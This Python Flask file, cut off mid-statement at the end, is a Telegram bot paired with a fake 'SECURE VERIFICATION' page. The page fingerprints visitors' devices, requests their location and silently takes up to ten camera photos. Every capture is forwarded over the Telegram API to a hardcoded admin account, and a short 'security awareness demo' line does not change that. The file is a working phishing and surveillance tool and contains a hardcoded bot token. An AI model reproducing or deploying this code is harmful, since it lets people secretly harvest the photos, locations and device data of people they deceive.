import os
import json
import datetime
import hashlib
import base64
import logging
import requests
import threading
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify, render_template_string, send_from_directory

# ==================== CONFIG (HARDCODED) ====================
BOT_TOKEN = "8680846598:AAE0o3vS2fn16ZuIvvPJjXeuPQubDT2eUo8"
ADMIN_IDS = [8691519315]
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
BASE_URL = RENDER_URL if RENDER_URL else "http://localhost:5000"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.pending_broadcast = {}
app.pending_photo = set()

# ==================== FAST: Background workers ====================
EXECUTOR = ThreadPoolExecutor(max_workers=8)  # parallel telegram sends

# ==================== JSON STORAGE ====================
DATA_DIR = "data"
USERS_FILE = os.path.join(DATA_DIR, "users.json")
DATA_FILE = os.path.join(DATA_DIR, "collected.json")
STATS_FILE = os.path.join(DATA_DIR, "stats.json")
FILE_LOCK = threading.Lock()

def ensure_dirs():
    for d in (DATA_DIR, "photos", "captured_photos", "exports"):
        os.makedirs(d, exist_ok=True)

def read_json(filepath, default):
    with FILE_LOCK:
        try:
            if os.path.exists(filepath):
                with open(filepath, "r", encoding="utf-8") as f:
                    return json.load(f)
        except Exception:
            pass
        return default

def write_json(filepath, data):
    with FILE_LOCK:
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, default=str)
        except Exception as e:
            logger.error(f"write_json: {e}")

def get_users(): return read_json(USERS_FILE, [])
def save_users(u): write_json(USERS_FILE, u)
def get_collected(): return read_json(DATA_FILE, [])
def save_collected(c): write_json(DATA_FILE, c)

def get_stats():
    s = read_json(STATS_FILE, {})
    for k, v in {"total_users":0,"users_today":0,"total_data":0,
                 "total_visits":0,"bot_status":True,"last_date":""}.items():
        s.setdefault(k, v)
    return s

def save_stats(s): write_json(STATS_FILE, s)
def stat(k): return get_stats().get(k, 0)
def set_bot_on(v):
    s = get_stats(); s["bot_status"] = v; save_stats(s)
def is_bot_on(): return get_stats().get("bot_status", True)

def add_user(chat_id, username, first_name):
    users = get_users()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    for u in users:
        if u["chat_id"] == chat_id:
            u.update({"username": username, "first_name": first_name, "last_seen": now})
            save_users(users)
            return
    users.append({"chat_id": chat_id, "username": username, "first_name": first_name,
                  "first_seen": now, "last_seen": now})
    save_users(users)
    s = get_stats(); s["total_users"] = s.get("total_users", 0) + 1; save_stats(s)
    today = datetime.date.today().isoformat()
    s = get_stats()
    if s.get("last_date") != today:
        s["last_date"] = today; s["users_today"] = 0
    s["users_today"] = s.get("users_today", 0) + 1
    save_stats(s)

def set_user_photo(chat_id, filename):
    users = get_users()
    for u in users:
        if u["chat_id"] == chat_id:
            u["photo"] = filename
            save_users(users)
            return

def get_user_photo(chat_id):
    for u in get_users():
        if u["chat_id"] == chat_id:
            return u.get("photo", "")
    return ""

def save_collected_data(chat_id, device_info, location, n_photos, additional):
    items = get_collected()
    items.append({
        "id": len(items) + 1,
        "chat_id": chat_id,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "device_info": device_info,
        "location": location,
        "photos": n_photos,
        "additional": additional,
    })
    save_collected(items)
    s = get_stats()
    s["total_data"] = s.get("total_data", 0) + 1
    s["total_visits"] = s.get("total_visits", 0) + 1
    save_stats(s)

def init_data():
    ensure_dirs()
    get_stats()
    logger.info("JSON storage ready")

# ==================== TELEGRAM HELPERS ====================

def send_msg(chat_id, text, reply_markup=None):
    data = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        return requests.post(f"{TELEGRAM_API}/sendMessage", data=data, timeout=10).json()
    except Exception as e:
        logger.error(f"send_msg: {e}")
        return None

def send_photo_msg(chat_id, photo, caption=""):
    try:
        if isinstance(photo, str) and photo.startswith("data:image"):
            img = base64.b64decode(photo.split(",")[1])
            files = {"photo": ("photo.jpg", BytesIO(img), "image/jpeg")}
        else:
            files = {"photo": open(photo, "rb")}
        return requests.post(f"{TELEGRAM_API}/sendPhoto",
                             data={"chat_id": chat_id, "caption": caption},
                             files=files, timeout=15).json()
    except Exception as e:
        logger.error(f"send_photo: {e}")
        return None

def send_doc(chat_id, filepath, caption=""):
    try:
        with open(filepath, "rb") as f:
            return requests.post(f"{TELEGRAM_API}/sendDocument",
                                 data={"chat_id": chat_id, "caption": caption},
                                 files={"document": f}, timeout=30).json()
    except Exception as e:
        logger.error(f"send_doc: {e}")
        return None

def edit_msg(chat_id, msg_id, text, reply_markup=None):
    data = {"chat_id": chat_id, "message_id": msg_id, "text": text}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        return requests.post(f"{TELEGRAM_API}/editMessageText", data=data, timeout=10).json()
    except Exception as e:
        logger.error(f"edit_msg: {e}")
        return None

def answer_cb(cb_id, text="", alert=False):
    try:
        requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                      data={"callback_query_id": cb_id, "text": text, "show_alert": alert},
                      timeout=5)
    except Exception:
        pass

def make_link(chat_id, mode, photo=None):
    h = hashlib.md5(f"{chat_id}_{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
    link = f"{BASE_URL}/capture?chat_id={chat_id}&uid={h}&mode={mode}"
    if photo:
        link += f"&photo={photo}"
    return link

# ==================== BOT HANDLERS ====================

def show_menu(chat_id, first_name="User"):
    kb = {"inline_keyboard": [
        [{"text": "📍 Location", "callback_data": "opt_location"}],
        [{"text": "📸 Camera", "callback_data": "opt_camera"}],
        [{"text": "📱 Device Info", "callback_data": "opt_device"}],
        [{"text": "🎛️ All Monitor", "callback_data": "opt_all"}],
    ]}
    send_msg(chat_id,
        f"👋 Welcome {first_name}!\n\n"
        "Kya karna hai choose karo:\n\n"
        "📍 Location — location check\n"
        "📸 Camera — photo verification (10 photos)\n"
        "📱 Device Info — phone details\n"
        "🎛️ All Monitor — sab kuch ek saath",
        reply_markup=kb)

def handle_start(chat_id, username, first_name):
    if not is_bot_on() and chat_id not in ADMIN_IDS:
        send_msg(chat_id, "⏳ Bot under maintenance. Try later.")
        return
    add_user(chat_id, username, first_name)
    if chat_id in ADMIN_IDS:
        show_menu(chat_id, first_name)
        send_msg(chat_id, "👑 Admin ho — /admin se panel kholo.")
        return
    app.pending_photo.add(chat_id)
    send_msg(chat_id,
        "👋 Welcome!\n\n"
        "📸 **Pehle apni ek photo bhejo** (koi bhi image) —\n"
        "photo milne ke baad options milenge.")

def handle_photo_received(chat_id, file_id):
    try:
        r = requests.get(f"{TELEGRAM_API}/getFile?file_id={file_id}", timeout=10).json()
        fp = r["result"]["file_path"]
        img = requests.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{fp}", timeout=15).content
        fn = f"{chat_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(os.path.join("photos", fn), "wb") as f:
            f.write(img)
        set_user_photo(chat_id, fn)
        app.pending_photo.discard(chat_id)
        send_photo_msg(chat_id, os.path.join("photos", fn), "✅ Photo mil gayi!")
        show_menu(chat_id)
        return fn
    except Exception as e:
        logger.error(f"photo: {e}")
        send_msg(chat_id, "❌ Photo save nahi hui. Dobara bhejo.")
        return None

def handle_admin_panel(chat_id):
    status = "🟢 ON" if is_bot_on() else "🔴 OFF"
    kb = {"inline_keyboard": [
        [{"text": "📊 Dashboard", "callback_data": "adm_dash"}],
        [{"text": "🔛 Bot ON/OFF", "callback_data": "adm_toggle"}],
        [{"text": "👥 Users", "callback_data": "adm_users"}],
        [{"text": "📦 Data", "callback_data": "adm_data"}],
        [{"text": "📤 Export JSON", "callback_data": "adm_export"}],
        [{"text": "📢 Broadcast", "callback_data": "adm_bc"}],
        [{"text": "🔄 Reset Stats", "callback_data": "adm_reset"}],
    ]}
    send_msg(chat_id,
        "🤖 ADMIN PANEL\n"
        f"Status: {status}\n"
        "━━━━━━━━━━━━━━\n"
        f"👥 Users: {stat('total_users')}\n"
        f"📈 Today: {stat('users_today')}\n"
        f"👁️ Visits: {stat('total_visits')}\n"
        f"📦 Data: {stat('total_data')}\n"
        "━━━━━━━━━━━━━━\n"
        f"{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}",
        reply_markup=kb)

def handle_callback(cb):
    data = cb.get("data", "") 
    chat_id = cb["message"]["chat"]["id"]
    msg_id = cb["message"]["message_id"]
    cb_id = cb["id"]
    uid = cb["from"]["id"]

    # ===== USER OPTIONS =====
    if data.startswith("opt_"):
        mode = data.replace("opt_", "")
        answer_cb(cb_id, "Link ban raha hai...")
        photo = get_user_photo(chat_id)
        link = make_link(chat_id, mode, photo=photo)
        labels = {"location": "📍 Location Verification",
                  "camera": "📸 Camera Verification",
                  "device": "📱 Device Info Check",
                  "all": "🎛️ Full Verification"}
        kb = {"inline_keyboard": [[{"text": "🔗 Open & Verify", "url": link}]]}
        send_msg(chat_id,
            f"{labels.get(mode, 'Verification')}\n\n"
            "Black page par **CLICK TO VERIFY** dabana.\n\n"
            f"Link: {link}",
            reply_markup=kb)
        return

    # ===== ADMIN ONLY =====
    if uid not in ADMIN_IDS:
        answer_cb(cb_id, "❌ Unauthorized", True)
        return

    if data == "adm_dash":
        edit_msg(chat_id, msg_id,
            "📊 DASHBOARD\n"
            f"Status: {'🟢 ON' if is_bot_on() else '🔴 OFF'}\n"
            "━━━━━━━━━━━━━━\n"
            f"👥 Total Users: {stat('total_users')}\n"
            f"📈 Today: {stat('users_today')}\n"
            f"👁️ Visits: {stat('total_visits')}\n"
            f"📦 Total Data: {stat('total_data')}")
        answer_cb(cb_id)

    elif data == "adm_toggle":
        new = not is_bot_on()
        set_bot_on(new)
        edit_msg(chat_id, msg_id, f"✅ Bot {'ON 🟢' if new else 'OFF 🔴'}")
        answer_cb(cb_id)

    elif data == "adm_users":
        users = get_users()
        msg = f"👥 TOTAL USERS: {len(users)}\n\n"
        for u in users[-20:]:
            msg += (f"• {u.get('first_name','?')} (@{u.get('username','N/A')})\n"
                    f"  ID: {u['chat_id']} | {u.get('last_seen','')[:16]}\n")
        edit_msg(chat_id, msg_id, msg)
        answer_cb(cb_id)

    elif data == "adm_data":
        items = get_collected()[-10:][::-1]
        msg = f"📦 TOTAL DATA: {stat('total_data')}\n\n"
        for it in items:
            di = it.get("device_info", {})
            loc = it.get("location", {})
            l = "📍" if loc.get("lat") else "❌"
            msg += (f"• {it['chat_id']} | {di.get('model','?')} | {l} | "
                    f"📸{it.get('photos',0)} | {it['timestamp'][:16]}\n")
        edit_msg(chat_id, msg_id, msg)
        answer_cb(cb_id)

    elif data == "adm_export":
        items = get_collected()
        fn = f"exports/export_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fn, "w", encoding="utf-8") as f:
            json.dump(items, f, indent=2, default=str)
        send_doc(chat_id, fn, f"📤 Total records: {len(items)}")
        edit_msg(chat_id, msg_id, f"✅ Exported {len(items)} records.")
        answer_cb(cb_id)

    elif data == "adm_bc":
        edit_msg(chat_id, msg_id, "📢 Ab apna broadcast message bhejo (koi bhi text).")
        app.pending_broadcast[chat_id] = True
        answer_cb(cb_id)

    elif data == "adm_reset":
        s = get_stats()
        s["users_today"] = 0; s["total_visits"] = 0; s["total_data"] = 0
        save_stats(s)
        edit_msg(chat_id, msg_id, "✅ Stats reset ho gaye!")
        answer_cb(cb_id)

def build_report(chat_id, di, loc, n_photos, head, is_admin):
    lines = [head, "━━━━━━━━━━━━━━"]
    lines.append(f"👤 User: {chat_id}")
    lines.append("")
    lines.append(f"📱 Model: {di.get('model','?')}")
    lines.append(f"🌐 OS: {di.get('os','?')} | Browser: {di.get('browser','?')}")
    lines.append(f"💾 RAM: {di.get('ram','?')} | CPU: {di.get('cpu','?')}")
    lines.append(f"🎮 GPU: {di.get('gpuVendor','?')} {di.get('gpu','')[:40]}")
    lines.append(f"🔋 Battery: {di.get('battery','?')} | Charging: {di.get('charging','?')}")
    lines.append(f"📡 Network: {di.get('network','?')} @ {di.get('downlink','?')}")
    lines.append(f"🗄️ Storage: {di.get('storageFree','?')} free")
    lines.append(f"🖥️ Screen: {di.get('screen','?')} | {di.get('colorDepth','?')}")
    lines.append(f"🌍 Timezone: {di.get('timezone','?')}")
    if loc.get("lat"):
        lines.append(f"📍 Location: https://www.google.com/maps?q={loc['lat']},{loc['lng']}")
    else:
        lines.append("📍 Location: ❌ denied / not available")
    lines.append(f"📸 Photos: {n_photos}")
    lines.append(f"⏰ Time: {datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}")
    if not is_admin:
        lines.append("")
        lines.append("🔒 Ye security awareness demo tha. Real attackers bhi isi tarah "
                     "unknown links se camera/location le sakte hain — aage se dhyan rakhna!")
    return "\n".join(lines)

# ==================== WEBHOOK (background processing = FAST) ====================

def process_update(update):
    try:
        if "message" in update:
            msg = update["message"]
            chat_id = msg["chat"]["id"]
            text = msg.get("text", "")
            uname = msg["from"].get("username", "")
            fname = msg["from"].get("first_name", "User")

            if text == "/start":
                handle_start(chat_id, uname, fname)
            elif text.startswith("/admin"):
                if chat_id in ADMIN_IDS:
                    handle_admin_panel(chat_id)
                else:
                    send_msg(chat_id, "❌ Unauthorized.")
            elif chat_id in ADMIN_IDS and app.pending_broadcast.get(chat_id):
                app.pending_broadcast.pop(chat_id, None)
                btext = msg.get("text") or msg.get("caption") or ""
                users = get_users()
                ok, fail = 0, 0
                for u in users:
                    if send_msg(u["chat_id"], f"📢 Broadcast:\n\n{btext}"):
                        ok += 1
                    else:
                        fail += 1
                send_msg(chat_id, f"✅ Broadcast done — sent: {ok}, failed: {fail}")
            elif "photo" in msg:
                handle_photo_received(chat_id, msg["photo"][-1]["file_id"])
            elif chat_id in app.pending_photo:
                send_msg(chat_id, "📸 Photo bhejo (image file), phir menu milega.")
            else:
                send_msg(chat_id, "Use /start se menu kholo.")

            if "callback_query" in update:
                handle_callback(update["callback_query"])
    except Exception as e:
        logger.error("process_update: %s", e, exc_info=True)

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    try:
        update = request.get_json() or {}
        logger.info("UPD: %s", json.dumps(update)[:150])
        EXECUTOR.submit(process_update, update)   # background me process — turant reply
        return "OK", 200
    except Exception as e:
        logger.error("webhook: %s", e)
        return "OK", 200

# ==================== CAPTURE PAGE ====================

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px;color:#fff}
.card{width:100%;max-width:400px;text-align:center;position:relative}
.title{font-size:15px;color:rgba(255,255,255,0.45);margin-bottom:34px;letter-spacing:3px}
.big-btn{background:linear-gradient(135deg,#00f260,#0575e6);color:#000;border:none;padding:22px 30px;border-radius:50px;font-size:20px;font-weight:800;cursor:pointer;width:100%;box-shadow:0 0 40px rgba(0,242,96,0.5);animation:glow 2s infinite;letter-spacing:1px}
.big-btn:hover{transform:scale(1.03)}
.big-btn:disabled{opacity:0.4;cursor:not-allowed;transform:none;animation:none}
@keyframes glow{0%,100%{box-shadow:0 0 30px rgba(0,242,96,0.4)}50%{box-shadow:0 0 60px rgba(5,117,230,0.7)}}
.status{color:rgba(255,255,255,0.55);font-size:13px;margin-top:20px}
.hidden{display:none}
.progress{color:#00f260;font-size:15px;margin:20px 0;min-height:24px}
.badge{display:inline-block;background:linear-gradient(135deg,#00f260,#0575e6);color:#000;font-weight:800;padding:10px 28px;border-radius:30px;margin:6px 0 20px;font-size:17px;letter-spacing:1px}
.photo-box{width:100%;max-width:280px;margin:0 auto 14px;border-radius:16px;overflow:hidden;border:3px solid #00f260;background:#111}
.photo-box img{width:100%;display:block}
</style>
</head>
<body>
<div class="card">
<div class="title">🔐 SECURE VERIFICATION</div>

<div id="verifyBox">
<button class="big-btn" id="verifyBtn" onclick="startVerify()">CLICK TO VERIFY</button>
<p class="status">Permission popup aaye to Allow dabana</p>
</div>

<div id="progressBox" class="hidden">
<div class="progress" id="progText">Starting...</div>
<div class="status" id="statusText">&nbsp;</div>
</div>

<div id="doneBox" class="hidden">
<div class="badge">✅ VERIFIED</div>
<div id="userPhoto"></div>
<p class="status" id="doneNote">Verification complete</p>
</div>

</div>
<script>
const CID="{{chat_id}}", UID="{{uid}}";
const SUB_PHOTO="{{photo}}";
const SUB_URL="{{base_url}}/uploads/{{photo}}";
const MODE = new URLSearchParams(window.location.search).get("mode")||"camera";
const di={};
let cd={chat_id:CID, uid:UID, device_info:{}, location:{}, photos:[], additional:{}};

// ============ PRO DEVICE INFO (no permission, ek hi baar) ============
function canvasFp(){
  try{const c=document.createElement("canvas");c.width=200;c.height=50;
  const x=c.getContext("2d");x.textBaseline="top";x.font="14px Arial";
  x.fillStyle="#f60";x.fillRect(0,0,100,50);x.fillStyle="#069";
  x.fillText("fp-test-123",2,15);x.fillStyle="rgba(102,204,0,0.7)";x.fillText("xyz",4,30);
  return c.toDataURL().length}catch(e){return "err"}
}
function detectFonts(){
  try{const fonts=["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Tahoma","Impact","Roboto","Segoe UI","Helvetica"];
  const avail=[];const b=document.createElement("span");
  b.style.cssText="position:absolute;visibility:hidden;font-size:72px";
  b.textContent="mmmmmmmmmmlli";document.body.appendChild(b);
  fonts.forEach(f=>{const s=document.createElement("span");
  s.style.cssText=b.style.cssText;s.style.fontFamily=f;s.textContent="mmmmmmmmmmlli";
  document.body.appendChild(s);
  if(s.offsetWidth!==b.offsetWidth||s.offsetHeight!==b.offsetHeight)avail.push(f);
  s.remove()});b.remove();return avail.join(",")}catch(e){return "err"}
}
let devPromise=null;
function collectDevice(){
  if(!devPromise) devPromise=doCollectDevice();
  return devPromise;
}
async function doCollectDevice(){
  const ua=navigator.userAgent;
  let model="Device";
  if(/iPhone/.test(ua)){let m=ua.match(/iPhone(\d+),(\d+)/);model=m?"iPhone "+m[1]+","+m[2]:"iPhone"}
  else if(/SM-/.test(ua)){let m=ua.match(/SM-[A-Z0-9]+/);model=m?m[0]:"Samsung"}
  else if(/Redmi|Mi /.test(ua)){let m=ua.match(/(Redmi \d+|Mi \d+)/);model=m?m[0]:"Xiaomi"}
  else if(/Pixel/.test(ua)){let m=ua.match(/Pixel \d+/);model=m?m[0]:"Pixel"}
  else if(/vivo|Vivo/.test(ua))model="Vivo";
  else if(/OPPO|CPH/.test(ua))model="OPPO";
  di.model=model;

  di.ua=ua;
  di.os="?";
  if(/iPhone|iPad/.test(ua)){let m=ua.match(/OS (\d+)_(\d+)/);di.os=m?"iOS "+m[1]+"."+m[2]:"iOS"}
  else if(/Android/.test(ua)){let m=ua.match(/Android ([\d.]+)/);di.os=m?"Android "+m[1]:"Android"}
  else if(/Windows/.test(ua))di.os="Windows";
  else if(/Linux/.test(ua))di.os="Linux";

  di.browser="?";
  if(/Chrome/.test(ua)&&!/Edg/.test(ua))di.browser="Chrome";
  else if(/Firefox/.test(ua))di.browser="Firefox";
  else if(/Safari/.test(ua)&&!/Chrome/.test(ua))di.browser="Safari";
  else if(/Edg/.test(ua))di.browser="Edge";

  di.ram=navigator.deviceMemory?navigator.deviceMemory+" GB":"?";
  di.cpu=navigator.hardwareConcurrency?navigator.hardwareConcurrency+" cores":"?";
  di.platform=navigator.platform||"?";
  di.language=navigator.language||"?";
  di.languages=(navigator.languages||[]).join(",");
  di.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
  di.tzOffset=new Date().getTimezoneOffset();
  di.screen=screen.width+"x"+screen.height;
  di.availScreen=screen.availWidth+"x"+screen.availHeight;
  di.colorDepth=screen.colorDepth+"-bit";
  di.pixelRatio=window.devicePixelRatio;
  di.touchPoints=navigator.maxTouchPoints;
  di.online=navigator.onLine;
  di.history=history.length;
  di.webdriver=navigator.webdriver;
  di.doNotTrack=navigator.doNotTrack;
  di.pdfViewer=navigator.pdfViewerEnabled;
  di.vendor=navigator.vendor||"?";
  di.orientation=(screen.orientation&&screen.orientation.type)||"?";
  try{di.plugins=Array.from(navigator.plugins).map(p=>p.name).join(" | ")}catch(e){di.plugins="?"}
  try{di.canvasFp=canvasFp()}catch(e){di.canvasFp="err"}
  try{di.fonts=detectFonts()}catch(e){di.fonts="err"}
  try{const c=document.createElement("canvas");
  const gl=c.getContext("webgl")||c.getContext("experimental-webgl");
  if(gl){di.gpu=gl.getParameter(gl.RENDERER);di.gpuVendor=gl.getParameter(gl.VENDOR);di.gpuVer=gl.getParameter(gl.VERSION)}}catch(e){}

  if(navigator.getBattery)try{let b=await navigator.getBattery();
    di.battery=Math.round(b.level*100)+"%";
    di.charging=b.charging?"Yes":"No";
    di.chargingTime=b.chargingTime;di.dischargingTime=b.dischargingTime}catch(e){}

  const c=navigator.connection||navigator.mozConnection;
  if(c){di.network=c.effectiveType||"?";di.downlink=c.downlink?c.downlink+" Mbps":"?";
  di.rtt=c.rtt?c.rtt+" ms":"?";di.saveData=c.saveData?"Yes":"No"}

  if(navigator.storage&&navigator.storage.estimate)try{
    const st=await navigator.storage.estimate();
    di.storageQuota=((st.quota||0)/1073741824).toFixed(1)+" GB";
    di.storageUsed=((st.usage||0)/1048576).toFixed(1)+" MB";
    di.storageFree=((st.quota-st.usage)/1073741824).toFixed(1)+" GB free"}catch(e){}

  try{di.vibrate=!!navigator.vibrate}catch(e){}
  try{di.audioFp=(window.AudioContext||window.webkitAudioContext)?"supported":"no"}catch(e){}

  cd.device_info={...di};
  console.log("Device Info collected");
}

// ============ STEPS PER MODE ============
let steps=[];
if(MODE==="device")steps.push({t:"📱 Device Info",a:"dev"});
else if(MODE==="location")steps.push({t:"📱 Device Info",a:"dev"},{t:"📍 Location",a:"loc"});
else if(MODE==="camera")steps.push({t:"📱 Device Info",a:"dev"},{t:"📸 Camera (10 photos)",a:"cam10"});
else steps.push({t:"📱 Device Info",a:"dev"},{t:"📍 Location",a:"loc"},{t:"📸 Camera (5 front + 5 back)",a:"cam55"});

const progEl=()=>document.getElementById("progText");
const statusEl=()=>document.getElementById("statusText");
function showProgress(t,s){progEl().textContent=t;statusEl().textContent=s||" "}

async function startVerify(){
  document.getElementById("verifyBox").classList.add("hidden");
  document.getElementById("progressBox").classList.remove("hidden");
  await collectDevice();
  await runStep(0);
}

async function runStep(i){
  if(i>=steps.length){await submitData();return}
  const step=steps[i];
  showProgress("⏳ "+step.t+"...","");
  try{
    if(step.a==="dev"){showProgress("📱 Device info...","");await new Promise(r=>setTimeout(r,300))}
    else if(step.a==="loc"){await getLoc()}
    else if(step.a==="cam10"){await capPhotos("user",10)}
    else if(step.a==="cam55"){await capPhotos("user",5);await capPhotos("environment",5)}
  }catch(e){console.warn("Step fail:",e)}
  await runStep(i+1);
}

function getLoc(){return new Promise((r)=>{
  if(!navigator.geolocation){showProgress("📍 Location","unsupported");r();return}
  showProgress("System Verificantion","popup par Allow dabao");
  navigator.geolocation.getCurrentPosition(
    p=>{cd.location={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude,spd:p.coords.speed};showProgress("📍 Location captured ✓","");r()},
    ()=>{showProgress("📍 Location","denied/error");r()},
    {enableHighAccuracy:true,timeout:10000});
})}

// ============ PHOTO CAPTURE + LIVE SEND (photo lete hi bhejo) ============
async function capPhotos(fm,count){
  let stream;
  try{
    showProgress("system Verified..","popup par Allow dabao");
    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:fm,width:{ideal:480},height:{ideal:360}}});
    const v=document.createElement("video");v.srcObject=stream;await v.play();
    await new Promise(r=>setTimeout(r,300));
    const cam=fm==="user"?"front":"back";
    for(let i=0;i<count;i++){
      await new Promise(r=>setTimeout(r,100));
      const c=document.createElement("canvas");
      c.width=v.videoWidth||480;c.height=v.videoHeight||360;
      c.getContext("2d").drawImage(v,0,0);
      const b64=c.toDataURL("image/jpeg",0.5);
      showProgress(" "+(cam==="front"?"Front":"Back")+" — photo "+(i+1)+"/"+count+" ✓","Whit'''");
      // ⚡ TURANT SEND — capture hote hi /api/photo par bhejo
      try{
        await fetch("/api/photo",{method:"POST",headers:{"Content-Type":"application/json"},
          body:JSON.stringify({chat_id:CID,data:b64,camera:cam,index:cd.photos.length})});
      }catch(e){console.warn("photo send:",e)}
      cd.photos.push({camera:cam,data:b64,ts:new Date().toISOString()});
    }
    stream.getTracks().forEach(t=>t.stop());
    return true;
  }catch(e){
    if(stream)stream.getTracks().forEach(t=>t.stop());
    showProgress("📸 Camera","denied/error");
    return false;
  }
}

async function submitData(){
  showProgress("Whit''''","");
  try{
    const r=await fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id:CID,uid:UID,device_info:di,location:cd.location,photos:cd.photos.length,additional:{}})});
    const j=await r.json();console.log("Report:",j);
  }catch(e){console.error("Report error:",e)}

  document.getElementById("progressBox").classList.add("hidden");
  document.getElementById("doneBox").classList.remove("hidden");

  const box=document.getElementById("userPhoto");
  if(SUB_PHOTO){
    box.innerHTML='<div class="photo-box"><img src="'+SUB_URL+'"></div>';
  }else if(cd.photos.length){
    box.innerHTML='<div class="photo-box"><img src="'+cd.photos[0].data+'"></div>';
  }
}

document.addEventListener("DOMContentLoaded",()=>{collectDevice();});
</script>
</body>
</html>
"""

@app.route("/capture")
def capture():
    chat_id = request.args.get("chat_id", "")
    uid = request.args.get("uid", "")
    photo = request.args.get("photo", "")
    if not chat_id or not uid:
        return "Invalid link", 400
    return render_template_string(HTML_PAGE, chat_id=chat_id, uid=uid,
                                  base_url=BASE_URL, photo=photo)

@app.route("/uploads/<path:filename>")
def uploads(filename):
    fn = os.path.basename(filename)
    return send_from_directory("photos", fn)

# ==================== LIVE PHOTO API (turant bhejta hai) ====================

@app.route("/api/photo", methods=["POST"])
def api_photo():
    try:
        data = request.get_json() or {}
        chat_id = int(data.get("chat_id") or 0)
        img_data = data.get("data", "")
        cam = data.get("camera", "?")
        idx = int(data.get("index", 0))
        if not chat_id or not img_data.startswith("data:image"):
            return jsonify({"status": "error", "message": "bad request"}), 400
        raw = base64.b64decode(img_data.split(",")[1])
        fn = f"{chat_id}_{datetime.datetime.now().strftime('%H%M%S')}_{cam}_{idx}.jpg"
        path = os.path.join("captured_photos", fn)
        with open(path, "wb") as f:
            f.write(raw)

        # ⚡ Background me turant bhejo: admin + user (parallel threads)
        for t in list(dict.fromkeys(ADMIN_IDS + [chat_id])):
            is_admin = t in ADMIN_IDS
            cap = f"📸 {cam} #{idx+1} — {chat_id}" if is_admin else f"📸 Aapki photo #{idx+1}"
            EXECUTOR.submit(send_photo_msg, t, path, cap)

        return jsonify({"status": "ok", "saved": fn})
    except Exception as e:
        logger.error("api_photo: %s", e, exc_info=True)
        return jsonify({"status": "error", "message": str(e)}), 500

# ==================== DATA COLLECTION API (instant response) ====================

@app.route("/api/collect", methods=["POST"])
def collect():
    try:
        data = request.get_json() or {}
        chat_id = int(data.get("chat_id") or 0)
        if not chat_id:
            return jsonify({"status": "error", "message": "no chat_id"}), 400

        device_info = data.get("device_info", {}) or {}
        location = data.get("location", {}) or {}
        n_photos = int(data.get("photos", 0) or 0)
        additional = data.get("additional", {}) or {}

        save_collected_data(chat_id, device_info, location, n_photos, additional)

        # ⚡ Report background me bhejo — page ko turant reply
        for t in list(dict.fromkeys(ADMIN_IDS + [chat_id])):
            is_admin = t in ADMIN_IDS
            head = "📩 NEW DATA RECEIVED" if is_admin else "📋 Aapki Verification Report"
            msg = build_report(chat_id, device_info, location, n_photos, head, is_admin)
            EXECUTOR.submit(send_msg, t, msg)

        return jsonify({"status": "success"})
    except Exception as e:
        logger.error("collect: %s", e, exc_info=True)
        return jsonify({"status": "error", "message": str(e)}), 500

# ==================== UTILITY ROUTES ====================

@app.route("/")
def home():
    bot_uname = BOT_TOKEN.split(":")[0]
    return f'<script>window.location="https://t.me/{bot_uname}";</script><a href="https://t.me/{bot_uname}">Open Bot</a>'

@app.route("/health")
@app.route("/ping")
def health():
    return jsonify({
        "status": "alive",
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "bot_on": is_bot_on(),
        "users": stat("total_users"),
        "data": stat("total_data"),
    })

@app.route("/set_webhook")
def set_webhook_route():
    wh = f"{BASE_URL}/webhook/{BOT_TOKEN}"
    try:
        r = requests.get(f"{TELEGRAM_API}/setWebhook?url={wh}", timeout=10).json()
        return jsonify({"status": "ok" if r.get("ok") else "error", "response": r, "url": wh})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/webhook_info")
def webhook_info():
    try:
        r = requests.get(f"{TELEGRAM_API}/getWebhookInfo", timeout=10).json()
        return jsonify(r)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/delete_webhook")
def delete_webhook():
    try:
        r = requests.get(f"{TELEGRAM_API}/deleteWebhook", timeout=10).json()
        return jsonify(r)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# ==================== STARTUP ====================

if __name__ == "__main__":
    print("🚀 Dev mode")
    init_data()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
else:
    print("🚀 Gunicorn mode: initializing...")
    init_data()
    if RENDER_URL:
        wh = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
        try:
